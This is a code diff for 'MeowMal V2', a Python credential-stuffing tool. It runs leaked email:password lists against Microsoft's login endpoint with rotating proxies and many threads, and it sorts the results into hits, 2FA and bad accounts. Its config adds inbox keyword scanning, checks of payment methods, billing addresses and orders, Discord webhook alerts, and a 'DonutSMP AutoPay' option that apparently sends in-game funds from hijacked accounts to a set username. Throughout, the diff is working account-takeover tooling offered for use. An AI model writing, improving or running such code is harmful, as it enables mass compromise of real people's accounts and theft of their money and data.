+            if len(available_proxies) == 0 and len(proxylist) > 0:
+                failed_proxies.clear()
+                proxy_failure_count.clear()
+                available_proxies = proxylist
+            
+            if len(available_proxies) > 0:
+                proxy = random.choice(available_proxies)
+            else:
+                return ({}, None) if return_raw else {}
 
         if proxytype == "'2'":
             protocol_prefix = 'socks4'
@@ -3469,170 +4073,84 @@ def getproxy():
         try:
             if '@' in proxy:
                 proxy_url = f'{protocol_prefix}://{proxy}'
-                return {'http': proxy_url, 'https': proxy_url}
+                res = {'http': proxy_url, 'https': proxy_url}
+                return (res, proxy) if return_raw else res
             parts = proxy.split(':')
             if len(parts) == 2:
                 ip, port = parts
                 proxy_url = f'{protocol_prefix}://{ip}:{port}'
-                return {'http': proxy_url, 'https': proxy_url}
+                res = {'http': proxy_url, 'https': proxy_url}
+                return (res, proxy) if return_raw else res
             elif len(parts) == 4:
                 ip, port, username, password = parts
                 proxy_url = f'{protocol_prefix}://{username}:{password}@{ip}:{port}'
-                return {'http': proxy_url, 'https': proxy_url}
+                res = {'http': proxy_url, 'https': proxy_url}
+                return (res, proxy) if return_raw else res
             elif len(parts) == 3 and ';' in parts[2]:
                 ip, port, auth = parts
                 user, password = auth.split(';', 1)
                 proxy_url = f'{protocol_prefix}://{user}:{password}@{ip}:{port}'
-                return {'http': proxy_url, 'https': proxy_url}
+                res = {'http': proxy_url, 'https': proxy_url}
+                return (res, proxy) if return_raw else res
             else:
                 proxy_url = f'{protocol_prefix}://{proxy}'
-                return {'http': proxy_url, 'https': proxy_url}
+                res = {'http': proxy_url, 'https': proxy_url}
+                return (res, proxy) if return_raw else res
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_error(f'Proxy format error: {str(e)}')
-            return {}
-    return {}
-def pre_check_combo(email, password):
-    
-    global twofa, maxretries, fname
-    
-    url = "https://login.live.com/ppsecure/post.srf"
-    
-    params = {
-        'nopa': "2", 'client_id': "7d5c843b-fe26-45f7-9073-b683b2ac7ec3",
-        'cobrandid': "8058f65d-ce06-4c30-9559-473c9275a65d", 'contextid': "F3FB0F6AB3D6991E",
-        'opid': "5F188DEDF4A1266A", 'bk': "1768757278",
-        'uaid': "b1d1e6fbf8b24f9b8a73b347b178d580", 'pid': "15216"
-    }
-    
-    payload = {
-        'ps': "2", 'psRNGCDefaultType': "", 'psRNGCEntropy': "", 'psRNGCSLK': "",
-        'canary': "", 'ctx': "", 'hpgrequestid': "",
-        'PPFT': "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
-        'PPSX': "P", 'NewUser': "1", 'FoundMSAs': "", 'fspost': "0", 'i21': "0",
-        'CookieDisclosure': "0", 'IsFidoSupported': "1", 'isSignupPost': "0",
-        'isRecoveryAttemptPost': "0", 'i13': "0", 'login': email, 'loginfmt': email,
-        'type': "11", 'LoginOptions': "3", 'lrt': "", 'lrtPartition': "",
-        'hisRegion': "", 'hisScaleUnit': "", 'cpr': "0", 'passwd': password
-    }
-    
-    headers = {
-        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
-        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'Accept-Encoding': "gzip, deflate, br, zstd", 'Cache-Control': "max-age=0",
-        'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
-        'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
-        'sec-ch-ua-platform-version': "\"12.0.0\"", 'Origin': "https://login.live.com",
-        'Upgrade-Insecure-Requests': "1", 'Sec-Fetch-Site': "same-origin",
-        'Sec-Fetch-Mode': "navigate", 'Sec-Fetch-User': "?1", 'Sec-Fetch-Dest': "document",
-        'Referer': "https://login.live.com/oauth20_authorize.srf?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E&ru=https%3A%2F%2Fuser.auth.xboxlive.com%2Fdefault.aspx&flowtoken=-Dlvz*VDmPVZZLUB5XJxsfDMTTcQljOxDsdPjDKzToqZjduHY6H8mvZDBmfh64KLbJ2nZ9eoEak3Z5i9cv6QnWc1AgKNCTVjbsdSkMM2udkvn*tMhRNlP*KMzWSv4xope0Tedsx0fH4ExWXxj47d!shbqu5cb72XzFK*iJMoesP5oeS*!QeCOp1srGs2ds7c0wcllXOmhW9BF5JvWeVnY4ggTVh*w4TUyV!keqrvHLOJZENELnYgCp5EjzPwdp2QPhnupdnWEyUzkQIzzXeB0HN4BAZJhJpQo3U8Hd3J4Z16oG7vbJZEpdHLpaxVe7RfSvg%24%24&uaid=b1d1e6fbf8b24f9b8a73b347b178d580&opid=5F188DEDF4A1266A",
-        'Accept-Language': "ar,en-US;q=0.9,en;q=0.8,ku;q=0.7,ro;q=0.6"
-    }
-    
-    current_try = 0
-    while current_try <= min(2, maxretries):
-        try:
-            proxy_config = None
-            if proxytype != "'4'":
-                try: proxy_config = getproxy()
-                except: pass
-                
-            response = requests.post(url, params=params, data=payload, headers=headers, proxies=proxy_config, timeout=15)
-            status_code = response.status_code
-            response_text = response.text.lower()
-            
-            if status_code >= 500 or status_code == 429:
-                current_try += 1
-                time.sleep(random.uniform(20.0, 30.0) if is_no_proxy() else 1.5)
-                continue
-                
-            two_fa_indicators = ['suggestedaction', 'sign in to continue', 'enter code', 'two-step', 'two. step', 'two factor', '2fa', 'second verification', 'verification code', 'authenticator', 'texted you', 'sent a code', 'enter the code', 'additional security', 'extra security']
-            if any(ind in response_text for ind in two_fa_indicators):
-                with open(f'results/{fname}/2fa.txt', 'a') as file:
-                    file.write(f'{email}:{password}\n')
-                if UI_ENABLED and ui:
-                    ui.log_2fa(email)
-                with stats_lock:
-                    twofa += 1
-                return "2FA"
-                
-            success_indicators = ['to do that, sign in', 'welcome', 'redirecting', 'location.href', 'home.live.com', 'account.microsoft.com', 'myaccount.microsoft.com', 'profile.microsoft.com', 'https://account.live.com/', 'microsoft account home', 'signed in successfully', "you're signed in"]
-            if any(ind in response_text for ind in success_indicators):
-                return "HIT"
-                
-            failure_indicators = ['invalid username or password', "that microsoft account doesn't exist", 'incorrect password', 'your account or password is incorrect', "sorry, that password isn't right", 'entered is incorrect', "account doesn't exist", 'no account found', 'wrong password', 'incorrect credentials', 'login failed', 'sign in unsuccessful', "we couldn't find an account", 'please check your credentials', 'sign-in was blocked', 'account is locked', 'suspended', 'temporarily locked', 'security challenge', 'unusual activity', 'verify your identity', 'account review', 'safety concerns']
-            if any(ind in response_text for ind in failure_indicators):
-                return "BAD"
-                
-            return "UNKNOWN"
-            
-        except requests.exceptions.RequestException:
-            current_try += 1
-            time.sleep(1.5)
-            continue
-        except Exception as e:
-            if UI_ENABLED and ui:
-                ui.log_error(f'Precheck error {email}: {str(e)[:40]}')
-            return "ERROR"
-            
-    return "ERROR"
+            return ({}, None) if return_raw else {}
+    return ({}, None) if return_raw else {}
 
-def Checker(combo):
-    global bad, checked, cpm, hits, errors
-    start_time = time.time()
+def normalize_combo(line):
+    if not line:
+        return None
+    line = line.strip()
+    if not line or ':' not in line:
+        return None
+    parts = line.split(':', 1)
+    email = parts[0].strip()
+    password = parts[1].strip() if len(parts) > 1 else ''
+    if email and password and '@' in email:
+        return f"{email}:{password}"
+    return None
+
+def Checker(combo, session=None):
+    global bad, checked, cpm, hits, errors, retries
     try:
-        warn_threshold = int(config.get('slow_check_warn_seconds', 75))
-    except Exception:
-        warn_threshold = 75
-    warn_on_slow = bool(config.get('warn_on_slow_check', False))
-    try:
-        combo = combo.strip()
-        if not combo or ':' not in combo:
+        norm = normalize_combo(combo)
+        if not norm:
             with stats_lock:
                 bad += 1
                 checked += 1
-                cpm += 1
             if UI_ENABLED and ui:
-                ui.log_bad(combo.split(':')[0] if ':' in combo else combo)
-                ui.log_info('Invalid combo format')
+                ui.log_bad(combo.split(':')[0] if combo and ':' in combo else combo)
             return
-        split = combo.split(':', 1)
+        split = norm.split(':', 1)
         email = split[0].strip()
-        password = split[1].strip() if len(split) > 1 else ''
-        if not email or not password:
-            with stats_lock:
-                bad += 1
-                checked += 1
-                cpm += 1
-            if UI_ENABLED and ui:
-                ui.log_bad(email or 'empty')
-                ui.log_info('Empty email or password')
-            return
+        password = split[1].strip()
         result = False
-        try:
-            result = authenticate(str(email), str(password))
-                
-            if warn_on_slow and time.time() - start_time > warn_threshold:
-                if UI_ENABLED and ui:
-                    ui.add_log(f'Other: Slow check (> {warn_threshold}s): {email}', 'INFO')
-        except TimeoutError:
-            if UI_ENABLED and ui:
-                ui.log_error(f'Account check taking too long: {email}')
-            result = False
-        except Exception as e:
-            if UI_ENABLED and ui:
-                ui.log_error(f'Error checking {email}: {str(e)[:50]}')
-            result = False
+        _max_check_retries = min(maxretries, 3)
+        for _attempt in range(_max_check_retries):
+            try:
+                result = authenticate(str(email), str(password), session=session)
+                if result == 'ERROR' and _attempt < _max_check_retries - 1:
+                    with stats_lock:
+                        retries += 1
+                    continue
+                break
+            except Exception:
+                result = 'ERROR'
+                if _attempt < _max_check_retries - 1:
+                    with stats_lock:
+                        retries += 1
+                    continue
+                break
         with stats_lock:
             checked += 1
-            cpm += 1
-        if result is True or result == "HIT":
+        if result is True or result == 'HIT' or result == 'VALID_MAIL' or result == '2FA':
             pass
-        elif result == "2FA":
-            pass
-        elif result == "VALID_MAIL":
-            pass
-        elif result == "ERROR":
+        elif result == 'ERROR':
             with stats_lock:
                 errors += 1
         else:
@@ -3641,34 +4159,36 @@ def Checker(combo):
             if UI_ENABLED and ui:
                 ui.log_bad(email)
             if config.get('save_bad', False):
-                with open(f'results/{fname}/Bads.txt', 'a') as f:
-                    f.write(f'{email}:{password}\n')
+                try:
+                    write_dedupe(fname, 'Bad.txt', f'{email}:{password}\n')
+                except Exception:
+                    pass
     except Exception as e:
         with stats_lock:
             bad += 1
             checked += 1
-            cpm += 1
             errors += 1
         if UI_ENABLED and ui:
-            ui.log_bad(combo.split(':')[0] if ':' in combo else combo.strip())
             ui.log_error(f'Error: {str(e)[:50]}')
+
+checker_start_time = None
+
 def logscreen():
-    global cpm, cpm1, screen, hits, bad, twofa, mfa, sfa, xgp, xgpu, vm, other, checked, retries, errors
+    global cpm, cpm1, screen, hits, bad, twofa, mfa, sfa, xgp, xgpu, vm, other, checked, retries, errors, checker_start_time, autopay_count
     total_combos = len(Combos)
+    if not checker_start_time:
+        checker_start_time = time.time()
     while checked < total_combos:
-        cpm_val = 0
-        if UI_ENABLED and getattr(ui, 'start_time', None):
-            elapsed = time.time() - ui.start_time
-            if elapsed > 0:
-                cpm_val = int(checked / elapsed * 60)
+        elapsed = time.time() - checker_start_time
+        cpm_val = int(checked / elapsed * 60) if elapsed > 0 else 0
+        cpm1 = cpm_val
         try:
-            title_stats = f"MeowMal by MeowMal Dev's | Checked: {checked}/{total_combos} - Hits: {hits} - Bad: {bad} - 2FA: {twofa} - SFA: {sfa} - MFA: {mfa} - XGP: {xgp} - XGPU: {xgpu} - Valid Mail: {vm} - Other: {other} - CPM: {cpm_val} - Retries: {retries} - Errors: {errors}"
+            title_stats = f"MeowMal V2 | Checked: {checked}/{total_combos} | Valid Mail: {vm} | Bad: {bad} | 2FA: {twofa} | Minecraft: {hits} | DonutSMP AutoPay: {autopay_count} | CPM: {cpm_val} | Retries: {retries}"
             utils.set_title(title_stats)
-        except:
+        except Exception:
             pass
         if UI_ENABLED and ui:
-            ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=total_combos, cpm=cpm_val, retries=retries, errors=errors)
-            ui.show_ui_screen()
+            ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, autopay=autopay_count, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=total_combos, cpm=cpm_val, retries=retries, errors=errors)
         time.sleep(1)
 
 
@@ -3719,33 +4239,27 @@ def Load():
             seen = set()
             unique_lines = []
             for line in lines:
-                line = line.strip()
-                if line and ':' in line:
-                    parts = line.split(':', 1)
-                    if len(parts) >= 2:
-                        email_lower = ''.join(c for c in parts[0].strip().lower() if c.isprintable() and not c.isspace())
-                        password = parts[1].strip()
-                        dedupe_key = f'{email_lower}:{password}'
-                        if dedupe_key not in seen:
-                            seen.add(dedupe_key)
-                            unique_lines.append(line)
+                norm = normalize_combo(line)
+                if norm:
+                    norm_lower = norm.lower()
+                    if norm_lower not in seen:
+                        seen.add(norm_lower)
+                        unique_lines.append(norm)
             Combos = unique_lines
             dupes_removed = len(lines) - len(Combos)
-            if dupes_removed > 0:
-                try:
-                    with open(filename, 'w', encoding='utf-8') as f:
-                        f.write('\n'.join(unique_lines) + '\n')
-                except:
-                    pass
+            num_threads = int(config.get('threads', 300))
+            lines_per_worker = max(1, len(Combos) // max(1, num_threads))
             print(f"\n{Fore.BLUE}{'=' * 60}")
             print(f'{Fore.CYAN}📄 File Statistics:')
+            print(f'{Fore.BLUE}  • Total Lines Read: {len(lines)}')
             print(f'{Fore.BLUE}  • Duplicates Removed: {dupes_removed}')
             print(f'{Fore.BLUE}  • Valid Combos Loaded: {len(Combos)}')
+            print(f'{Fore.BLUE}  • Lines / Worker: ~{lines_per_worker}')
             print(f"{Fore.BLUE}{'=' * 60}")
             if UI_ENABLED and ui:
-                ui.log_info(f'Loaded {len(Combos)} combos ({dupes_removed} duplicates removed)')
+                ui.log_info(f'Loaded {len(Combos)} combos ({dupes_removed} duplicates removed, ~{lines_per_worker} lines/worker)')
             print(f'\n{Fore.CYAN}✓ File loaded successfully!{Fore.RESET}')
-            time.sleep(3)
+            time.sleep(1)
     except (IOError, OSError, MemoryError) as e:
         print(f'\n✗ Error reading combo file: {str(e)}')
         print('Please check the file and try again.')
@@ -3763,62 +4277,62 @@ def loadconfig():
             return value
         return str(value).lower() in ('yes', 'true', 't', '1', 'on')
     config_loader = ConfigLoader('config.ini')
-    config_data = config_loader.get_general_config()
-    checker_config = config_loader.get_checker_config()
-    capture_config = config_loader.get_capture_config()
-    maxretries = config_data.get('max_retries', 3)
-    config.set('threads', config_data.get('threads', 10))
+    config_loader.parse_all_sections()
+    for key, value in config_loader.settings.items():
+        config.set(key, value)
+    maxretries = int(config_loader.settings.get('max_retries', 2))
+    config.set('threads', int(config_loader.settings.get('threads', 300)))
     config.set('max_retries', maxretries)
-    config.set('timeout', config_data.get('timeout', 15))
-    config.set('use_proxies', config_data.get('use_proxies', False))
-    for key, value in checker_config.items():
-        config.set(key, value)
-    for key, value in capture_config.items():
-        config.set(key, value)
-    config.set('scan_inbox', config_data.get('scan_inbox', False))
-    config.set('enable_notifications', config_loader.get('enable_notifications', False))
-    config.set('discord_webhook_url', config_loader.get('discord_webhook_url', ''))
-    config.set('webhook_username', config_loader.get('webhook_username', 'MeowMal Checker'))
-    config.set('webhook_avatar_url', config_loader.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'))
-    config.set('notify_on_hit', config_loader.get('notify_on_hit', True))
-    config.set('notify_on_game_pass', config_loader.get('notify_on_game_pass', True))
-    config.set('notify_on_mfa', config_loader.get('notify_on_mfa', True))
-    config.set('embed_thumbnail', config_loader.get('embed_thumbnail', True))
-    config.set('embed_footer', config_loader.get('embed_footer', True))
-    config.set('embed_thumbnail_url', config_loader.get('embed_thumbnail_url', config_loader.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png')))
-    config.set('embed_image_enabled', config_loader.get('embed_image_enabled', True))
-    config.set('embed_image_template', config_loader.get('embed_image_template', 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip'))
-    embed_color_hit = validate_hex_color(config_loader.get('embed_color_hit', '#57F287'))
-    embed_color_xgp = validate_hex_color(config_loader.get('embed_color_xgp', '#3498DB'))
+    config.set('timeout', int(config_loader.settings.get('timeout', 6)))
+    config.set('use_proxies', str_to_bool(config_loader.settings.get('use_proxies', True)))
+    config.set('scan_inbox', str_to_bool(config_loader.settings.get('scan_inbox', True)))
+    config.set('inbox_keywords', config_loader.settings.get('inbox_keywords', 'steam, netflix, Crunchyroll, discord, microsoft, nordvpn'))
+    config.set('donut_stats', str_to_bool(config_loader.settings.get('donut_stats', True)))
+    config.set('donut_api_key', config_loader.settings.get('donut_api_key', ''))
+    config.set('donutsmp_autopay', str_to_bool(config_loader.settings.get('donutsmp_autopay', True)))
+    config.set('donutsmp_pay_username', config_loader.settings.get('donutsmp_pay_username', 'RivanSoul'))
+    config.set('donutsmp_server', config_loader.settings.get('donutsmp_server', 'donutsmp.net'))
+    config.set('enable_notifications', str_to_bool(config_loader.settings.get('enable_notifications', False)))
+    config.set('discord_webhook_url', config_loader.settings.get('discord_webhook_url', ''))
+    config.set('webhook_username', config_loader.settings.get('webhook_username', 'MeowMal Checker'))
+    config.set('webhook_avatar_url', config_loader.settings.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'))
+    config.set('notify_on_hit', str_to_bool(config_loader.settings.get('notify_on_hit', True)))
+    config.set('notify_on_game_pass', str_to_bool(config_loader.settings.get('notify_on_game_pass', True)))
+    config.set('notify_on_mfa', str_to_bool(config_loader.settings.get('notify_on_mfa', True)))
+    config.set('embed_thumbnail', str_to_bool(config_loader.settings.get('embed_thumbnail', True)))
+    config.set('embed_footer', str_to_bool(config_loader.settings.get('embed_footer', True)))
+    config.set('embed_thumbnail_url', config_loader.settings.get('embed_thumbnail_url', 'https://i.imgur.com/4M34hi2.png'))
+    config.set('embed_image_enabled', str_to_bool(config_loader.settings.get('embed_image_enabled', True)))
+    config.set('embed_image_template', config_loader.settings.get('embed_image_template', 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip'))
+    embed_color_hit = validate_hex_color(config_loader.settings.get('embed_color_hit', '#57F287'))
+    embed_color_xgp = validate_hex_color(config_loader.settings.get('embed_color_xgp', '#3498DB'))
     config.set('embed_color_hit', embed_color_hit if embed_color_hit is not None else 5763719)
     config.set('embed_color_xgp', embed_color_xgp if embed_color_xgp is not None else 3447003)
-    config.set('check_microsoft_balance', config_loader.get('check_microsoft_balance', False))
-    config.set('check_rewards_points', config_loader.get('check_rewards_points', True))
-    config.set('check_payment_methods', config_loader.get('check_payment_methods', True))
-    config.set('check_subscriptions', config_loader.get('check_subscriptions', True))
-    config.set('check_orders', config_loader.get('check_orders', True))
-    config.set('check_billing_address', config_loader.get('check_billing_address', True))
-    config.set('scan_inbox', config_loader.get('scan_inbox', True))
-    config.set('inbox_keywords', config_loader.get('inbox_keywords', ''))
+    config.set('check_microsoft_balance', str_to_bool(config_loader.settings.get('check_microsoft_balance', False)))
+    config.set('check_rewards_points', str_to_bool(config_loader.settings.get('check_rewards_points', True)))
+    config.set('check_payment_methods', str_to_bool(config_loader.settings.get('check_payment_methods', True)))
+    config.set('check_subscriptions', str_to_bool(config_loader.settings.get('check_subscriptions', True)))
+    config.set('check_orders', str_to_bool(config_loader.settings.get('check_orders', True)))
+    config.set('check_billing_address', str_to_bool(config_loader.settings.get('check_billing_address', True)))
     proxy_config = config_loader.get_proxy_config()
-    config.set('auto_proxy', proxy_config.get('auto_proxy', False))
+    config.set('auto_proxy', str_to_bool(proxy_config.get('auto_proxy', False)))
     config.set('proxy_api', proxy_config.get('proxy_api', ''))
-    config.set('request_num', proxy_config.get('request_num', 3))
-    config.set('proxy_time', proxy_config.get('proxy_time', 5))
-    config.set('show_live_logs', config_loader.get('show_live_logs', True))
-    config.set('cui_theme', config_loader.get('theme', 'blue'))
+    config.set('request_num', int(proxy_config.get('request_num', 3)))
+    config.set('proxy_time', int(proxy_config.get('proxy_time', 5)))
+    config.set('show_live_logs', str_to_bool(config_loader.settings.get('show_live_logs', True)))
+    config.set('cui_theme', config_loader.settings.get('theme', 'blue'))
     try:
-        config.set('warn_on_slow_check', config_loader.get('warn_on_slow_check', False))
+        config.set('warn_on_slow_check', str_to_bool(config_loader.settings.get('warn_on_slow_check', False)))
     except Exception:
         config.set('warn_on_slow_check', False)
     try:
-        config.set('slow_check_warn_seconds', int(config_loader.get('slow_check_warn_seconds', 75)))
+        config.set('slow_check_warn_seconds', int(config_loader.settings.get('slow_check_warn_seconds', 75)))
     except Exception:
         config.set('slow_check_warn_seconds', 75)
-    config.set('optimize_network', config_loader.get('optimize_network', True))
-    config.set('connection_pool_size', config_loader.get('connection_pool_size', 100))
-    config.set('dns_cache_enabled', config_loader.get('dns_cache_enabled', True))
-    config.set('keep_alive_enabled', config_loader.get('keep_alive_enabled', True))
+    config.set('optimize_network', str_to_bool(config_loader.settings.get('optimize_network', True)))
+    config.set('connection_pool_size', int(config_loader.settings.get('connection_pool_size', 1000)))
+    config.set('dns_cache_enabled', str_to_bool(config_loader.settings.get('dns_cache_enabled', True)))
+    config.set('keep_alive_enabled', str_to_bool(config_loader.settings.get('keep_alive_enabled', True)))
     return True
 def Main():
     global fname, screen, config, proxytype, banproxies, errors, cpm1, hits, bad, twofa, vm, xgp, xgpu, other, mfa, sfa, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, checked, retries
@@ -3854,7 +4368,13 @@ def Main():
         print(f'{Fore.GREEN}✓ Network optimization: ENABLED (timeout: {timeout}){Fore.RESET}\n')
     else:
         print(f'{Fore.YELLOW}⚠ Network optimization: DISABLED{Fore.RESET}\n')
+
     Proxys()
+    thread = int(config.get('threads', 300))
+    if proxytype == "'4'" and thread > 150:
+        print(f'{Fore.YELLOW}⚠ Proxyless mode: capping threads {thread} → 150 to avoid rate-limiting.{Fore.RESET}')
+        thread = 150
+    print(f'{Fore.CYAN}✓ Active Worker Threads: {thread}{Fore.RESET}')
     print(f"{Fore.BLUE}{'=' * 60}")
     print(f'{Fore.CYAN}📁 LOAD COMBO FILE')
     print(f"{Fore.BLUE}{'=' * 60}{Fore.RESET}")
@@ -3868,42 +4388,51 @@ def Main():
     timestamp = datetime.now().strftime('%Y-%m-%d_%H%M%S')
     fname = timestamp
     if not os.path.exists(f'results/{fname}'):
-        os.makedirs(f'results/{fname}')
-        open(f'results/{fname}/donut_stats.txt', 'a', encoding='utf-8').close()
-    print(f'\n{Fore.GREEN}Starting checker...{Fore.RESET}')
+        os.makedirs(f'results/{fname}', exist_ok=True)
+
+    print(f'\n{Fore.GREEN}Starting high-performance checker...{Fore.RESET}')
     print(f'{Fore.CYAN}Results will be saved to: results/{fname}{Fore.RESET}\n')
     try:
+
+        global checker_start_time
+        checker_start_time = time.time()
         threading.Thread(target=logscreen, daemon=True).start()
-        print(f'{Fore.GREEN}Checking {len(Combos)} accounts with {thread} threads...{Fore.RESET}\n')
+        print(f'{Fore.GREEN}Processing {len(Combos)} accounts across {thread} device workers...{Fore.RESET}\n')
         if UI_ENABLED and ui:
             ui.start_checking(len(Combos))
-        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
-            future_to_combo = {executor.submit(Checker, combo): combo for combo in Combos}
-            processed_count = 0
+        import queue
+        combo_queue = queue.Queue()
+        for combo in Combos:
+            combo_queue.put(combo)
+
+        def _worker():
+            worker_session = create_optimized_session()
+            while True:
+                try:
+                    c = combo_queue.get_nowait()
+                except queue.Empty:
+                    break
+                try:
+                    Checker(c, session=worker_session)
+                except Exception as e:
+                    with stats_lock:
+                        global errors, checked
+                        errors += 1
+                        checked += 1
+                    if UI_ENABLED and ui:
+                        ui.log_error(f'Worker error: {str(e)[:50]}')
+                finally:
+                    combo_queue.task_done()
+
+        workers = []
+        for _ in range(thread):
+            w = threading.Thread(target=_worker)
+            w.daemon = True
+            w.start()
+            workers.append(w)
             
-            try:
-                for future in concurrent.futures.as_completed(future_to_combo):
-                    combo = future_to_combo[future]
-                    processed_count += 1
-                    try:
-                        future.result()
-                    except Exception as e:
-                        with stats_lock:
-                            errors += 1
-                            bad += 1
-                            checked += 1
-                            cpm += 1
-                        if UI_ENABLED and ui:
-                            ui.log_error(f'Error: {str(e)[:50]}')
-                        else:
-                            print(f'{Fore.RED}Worker error: {str(e)[:50]}{Fore.RESET}')
-                    
-                    if processed_count % 1000 == 0:
-                        import gc
-                        gc.collect()
-            except Exception as e:
-                 if UI_ENABLED and ui:
-                     ui.log_error(f"Processing error: {e}")
+        for w in workers:
+            w.join()
         print(f"\n{Fore.CYAN}{'=' * 60}")
         print(f'{Fore.YELLOW}⏳ Collecting Final Live Stats...')
         print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
@@ -3916,7 +4445,7 @@ def Main():
             except:
                 pass
             if UI_ENABLED and ui:
-                ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=len(Combos), cpm=cpm1 * 60, retries=retries, errors=errors)
+                ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=len(Combos), cpm=cpm1, retries=retries, errors=errors)
                 ui.show_ui_screen()
             time.sleep(1)
         try:
@@ -3976,25 +4505,48 @@ def Main():
         except EOFError:
             pass
     finally:
+        try:
+            _flush_write_buffer()  
+        except Exception:
+            pass
         print(f'\n{Fore.CYAN}Thank you for using MeowMal! 🐱{Fore.RESET}\n')
 def detect_proxy_protocol(proxies_list):
     if not proxies_list:
         return '4'
-    print(f'{Fore.BLUE}🔍 Detecting proxy type...{Fore.RESET}')
-    protocols = [('socks5', '3'), ('socks4', '2'), ('http', '1')]
+    print(f'{Fore.BLUE}🔍 Detecting proxy type and testing connectivity...{Fore.RESET}')
+    protocols = [('http', '1'), ('socks5', '3'), ('socks4', '2')]
     max_checks = min(3, len(proxies_list))
+    alive_count = 0
+    detected_proto = None
     for i in range(max_checks):
         test_proxy = proxies_list[i]
         for scheme, type_code in protocols:
             try:
-                proxy_url = f'{scheme}://{test_proxy}'
+                if '@' in test_proxy:
+                    proxy_url = f'{scheme}://{test_proxy}'
+                else:
+                    parts = test_proxy.split(':')
+                    if len(parts) == 4:
+                        ip, port, user, pwd = parts
+                        proxy_url = f'{scheme}://{user}:{pwd}@{ip}:{port}'
+                    elif len(parts) == 2:
+                        ip, port = parts
+                        proxy_url = f'{scheme}://{ip}:{port}'
+                    else:
+                        proxy_url = f'{scheme}://{test_proxy}'
                 proxies = {'http': proxy_url, 'https': proxy_url}
-                response = requests.get('http://www.google.com', proxies=proxies, timeout=2)
-                if response.status_code == 200:
-                    print(f'{Fore.CYAN}✓ Detected {scheme.upper()} proxy{Fore.RESET}')
-                    return type_code
-            except:
+                response = requests.get('https://login.live.com', proxies=proxies, timeout=2)
+                if response.status_code in (200, 302, 400, 401, 404):
+                    alive_count += 1
+                    if detected_proto is None:
+                        detected_proto = type_code
+                        print(f'{Fore.CYAN}✓ Detected {scheme.upper()} proxy (sample {i+1} connected){Fore.RESET}')
+                    break
+            except Exception:
                 continue
+    if detected_proto:
+        return detected_proto
+    print(f'{Fore.YELLOW}⚠ Warning: Sample proxies could not connect to Microsoft.{Fore.RESET}')
     print(f'{Fore.BLUE}ℹ Defaulting to HTTP proxy type.{Fore.RESET}')
     return '1'
 def Proxys():
@@ -4002,6 +4554,10 @@ def Proxys():
     print(f"\n{Fore.BLUE}{'=' * 60}")
     print(f'{Fore.CYAN}AUTO LOAD PROXY FILE')
     print(f"{Fore.BLUE}{'=' * 60}{Fore.RESET}")
+    if not config.get('use_proxies', True):
+        print(f"{Fore.CYAN}ℹ Proxyless mode enabled in config.ini.{Fore.RESET}")
+        proxytype = "'4'"
+        return
     filename = 'proxies.txt'
     if not os.path.exists(filename):
         print(f"{Fore.BLUE}⚠ 'proxies.txt' not found.{Fore.RESET}")
@@ -4013,6 +4569,7 @@ def Proxys():
             proxylist = [line.strip() for line in f if line.strip()]
         if not proxylist:
             print(f"{Fore.BLUE}⚠ 'proxies.txt' is empty.{Fore.RESET}")
+            print(f'{Fore.BLUE}Continuing without proxies (Proxyless Mode).{Fore.RESET}')
             proxytype = "'4'"
             return
         print(f'{Fore.CYAN}[{len(proxylist)}] Proxies Loaded.{Fore.RESET}')
